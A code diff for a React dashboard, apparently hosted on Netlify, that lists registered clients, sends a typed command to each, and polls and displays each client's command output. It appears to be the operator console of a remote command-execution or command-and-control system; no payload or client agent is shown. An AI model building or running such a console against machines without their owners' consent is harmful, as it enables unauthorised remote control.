@@ -2,17 +2,21 @@ import { useEffect, useState } from 'react';
 
 export default function Home() {
   const [clients, setClients] = useState({});
+  const [output, setOutput] = useState({});
 
   useEffect(() => {
-    const fetchClients = async () => {
-      const res = await fetch('/api/clients');
-      const data = await res.json();
-      setClients(data);
-    };
-    fetchClients();
-    const interval = setInterval(fetchClients, 5000);
+    const interval = setInterval(() => {
+      fetch('/api/clients').then(res => res.json()).then(setClients);
+      Object.keys(clients).forEach(id => {
+        fetch('/api/output/' + id).then(res => res.json()).then(data => {
+          if (data.output) {
+            setOutput(prev => ({ ...prev, [id]: data.output }));
+          }
+        });
+      });
+    }, 2000);
     return () => clearInterval(interval);
-  }, []);
+  }, [clients]);
 
   const sendCommand = async (clientId) => {
     const cmd = document.getElementById(`cmd-${clientId}`).value;
@@ -26,17 +30,18 @@ export default function Home() {
 
   return (
     <main style={{ padding: 20 }}>
-      <h1>Manager Dashboard on Netlify 🚀</h1>
-      <h2>Registered Clients:</h2>
-      <ul>
-        {Object.keys(clients).map(id => (
-          <li key={id}>
-            <strong>{clients[id].username}</strong> ({id}) - {clients[id].status}
+      <h1>Netlify Console Manager 🚀</h1>
+      <h2>Clients:</h2>
+      {Object.keys(clients).map(id => (
+        <div key={id} style={{ marginBottom: 20 }}>
+          <strong>{clients[id].username}</strong> ({id}) - {clients[id].status}
+          <div>
             <input id={`cmd-${id}`} placeholder="Command" />
             <button onClick={() => sendCommand(id)}>Send</button>
-          </li>
-        ))}
-      </ul>
+          </div>
+          <pre style={{ background: '#eee', padding: 10 }}>{output[id] || ''}</pre>
+        </div>
+      ))}
     </main>
   );
 }
